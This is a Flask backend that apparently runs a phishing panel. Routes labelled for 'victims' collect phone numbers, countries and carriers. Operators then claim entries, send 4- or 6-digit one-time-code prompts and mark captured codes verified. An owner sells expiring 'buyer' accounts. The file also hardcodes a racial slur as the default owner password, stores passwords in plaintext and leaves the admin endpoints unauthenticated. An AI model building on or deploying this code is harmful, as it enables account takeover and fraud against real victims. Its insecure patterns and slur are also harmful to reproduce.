from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import json
import os
import uuid
from datetime import datetime, timedelta

app = Flask(__name__, static_folder='.')
CORS(app)

DB_FILE = 'database.json'
CONFIG_FILE = 'config.json'

def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    return {"queues": {"A": [], "B": [], "C": []}}

def save_db(data):
    with open(DB_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    return {"owners": [], "buyers": []}

def save_config(data):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(data, f, indent=2)

# ============================================================
# INIT — RUNS ON STARTUP
# ============================================================

def init():
    config = load_config()
    if not config.get('owners'):
        config['owners'] = [{
            'username': 'owner',
            'password': 'nigga',
            'created': datetime.now().isoformat()
        }]
        save_config(config)
        print("✅ Owner created")
    
    db = load_db()
    if not db.get('queues'):
        db['queues'] = {"A": [], "B": [], "C": []}
        save_db(db)

init()

# ============================================================
# ROUTES - VICTIM
# ============================================================

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/admin')
def admin():
    return send_from_directory('.', 'admin.html')

@app.route('/api/submit', methods=['POST'])
def submit():
    data = request.json
    qid = str(uuid.uuid4())[:8]
    db = load_db()
    
    queue = data.get('queue', 'C')
    if queue not in db['queues']:
        db['queues'][queue] = []
    
    entry = {
        'id': qid,
        'number': data.get('number'),
        'country': data.get('country'),
        'network': data.get('network'),
        'timestamp': datetime.now().isoformat(),
        'status': 'pending',
        'otp_length': 4,
        'otp': None,
        'verified': False,
        'claimed_by': None
    }
    
    db['queues'][queue].append(entry)
    save_db(db)
    return jsonify({'success': True, 'queueId': qid})

# ============================================================
# ROUTES - ADMIN API
# ============================================================

@app.route('/api/admin/queues', methods=['GET'])
def get_queues():
    return jsonify(load_db()['queues'])

@app.route('/api/admin/update', methods=['POST'])
def update():
    data = request.json
    qid = data.get('queueId')
    action = data.get('action')
    otp = data.get('otp')
    username = data.get('username', 'unknown')
    
    db = load_db()
    
    for q, entries in db['queues'].items():
        for entry in entries:
            if entry['id'] == qid:
                
                if action == 'claimed':
                    entry['status'] = 'claimed'
                    entry['claimed_by'] = username
                
                elif action == 'wrong':
                    entry['status'] = 'wrong'
                
                elif action == 'verified':
                    entry['status'] = 'verified'
                    entry['verified'] = True
                
                elif action == 'otp_4':
                    entry['otp_length'] = 4
                    entry['otp'] = otp
                    entry['status'] = 'otp_sent'
                
                elif action == 'otp_6':
                    entry['otp_length'] = 6
                    entry['otp'] = otp
                    entry['status'] = 'otp_sent'
                
                elif action == 'verify_otp':
                    if entry.get('otp') == otp:
                        entry['status'] = 'verified'
                        entry['verified'] = True
                        save_db(db)
                        return jsonify({'success': True})
                    else:
                        return jsonify({'success': False})
                
                elif action == 'resend':
                    entry['status'] = 'pending'
                    entry['otp'] = None
                
                save_db(db)
                return jsonify({'success': True})
    
    return jsonify({'success': False})

@app.route('/api/admin/stats', methods=['GET'])
def stats():
    db = load_db()
    all_entries = []
    for entries in db['queues'].values():
        all_entries.extend(entries)
    
    return jsonify({
        'total': len(all_entries),
        'pending': len([e for e in all_entries if e['status'] in ['pending', 'claimed']]),
        'otp_sent': len([e for e in all_entries if e['status'] == 'otp_sent']),
        'verified': len([e for e in all_entries if e['status'] == 'verified']),
        'wrong': len([e for e in all_entries if e['status'] == 'wrong'])
    })

# ============================================================
# ROUTES - AUTH
# ============================================================

@app.route('/api/auth/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    
    config = load_config()
    
    for owner in config.get('owners', []):
        if owner['username'] == username and owner['password'] == password:
            token = str(uuid.uuid4())
            owner['token'] = token
            save_config(config)
            return jsonify({'success': True, 'token': token, 'role': 'owner', 'username': username})
    
    for buyer in config.get('buyers', []):
        if buyer['username'] == username and buyer['password'] == password:
            if buyer.get('expiry'):
                if datetime.now() > datetime.fromisoformat(buyer['expiry']):
                    return jsonify({'success': False, 'message': 'Expired'})
            token = str(uuid.uuid4())
            buyer['token'] = token
            save_config(config)
            return jsonify({'success': True, 'token': token, 'role': 'buyer', 'username': username})
    
    return jsonify({'success': False, 'message': 'Invalid'})

@app.route('/api/auth/verify', methods=['POST'])
def verify():
    token = request.json.get('token')
    config = load_config()
    
    for owner in config.get('owners', []):
        if owner.get('token') == token:
            return jsonify({'success': True, 'role': 'owner', 'username': owner['username']})
    
    for buyer in config.get('buyers', []):
        if buyer.get('token') == token:
            if buyer.get('expiry'):
                if datetime.now() > datetime.fromisoformat(buyer['expiry']):
                    return jsonify({'success': False, 'message': 'Expired'})
            return jsonify({'success': True, 'role': 'buyer', 'username': buyer['username']})
    
    return jsonify({'success': False})

@app.route('/api/auth/create_buyer', methods=['POST'])
def create_buyer():
    data = request.json
    token = data.get('token')
    new_user = data.get('username')
    new_pass = data.get('password')
    days = int(data.get('days', 30))
    
    config = load_config()
    
    is_owner = False
    for owner in config.get('owners', []):
        if owner.get('token') == token:
            is_owner = True
            break
    
    if not is_owner:
        return jsonify({'success': False, 'message': 'Only owners'})
    
    for buyer in config.get('buyers', []):
        if buyer['username'] == new_user:
            return jsonify({'success': False, 'message': 'Exists'})
    
    expiry = (datetime.now() + timedelta(days=days)).isoformat()
    config['buyers'].append({
        'username': new_user,
        'password': new_pass,
        'created': datetime.now().isoformat(),
        'expiry': expiry
    })
    save_config(config)
    return jsonify({'success': True})

@app.route('/api/auth/list_buyers', methods=['POST'])
def list_buyers():
    token = request.json.get('token')
    config = load_config()
    
    is_owner = False
    for owner in config.get('owners', []):
        if owner.get('token') == token:
            is_owner = True
            break
    
    if not is_owner:
        return jsonify({'success': False})
    
    buyers = []
    for buyer in config.get('buyers', []):
        buyers.append({
            'username': buyer['username'],
            'expiry': buyer.get('expiry', 'Never')
        })
    
    return jsonify({'success': True, 'buyers': buyers})

@app.route('/api/auth/delete_buyer', methods=['POST'])
def delete_buyer():
    token = request.json.get('token')
    username = request.json.get('username')
    
    config = load_config()
    
    is_owner = False
    for owner in config.get('owners', []):
        if owner.get('token') == token:
            is_owner = True
            break
    
    if not is_owner:
        return jsonify({'success': False})
    
    for i, buyer in enumerate(config.get('buyers', [])):
        if buyer['username'] == username:
            config['buyers'].pop(i)
            save_config(config)
            return jsonify({'success': True})
    
    return jsonify({'success': False})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
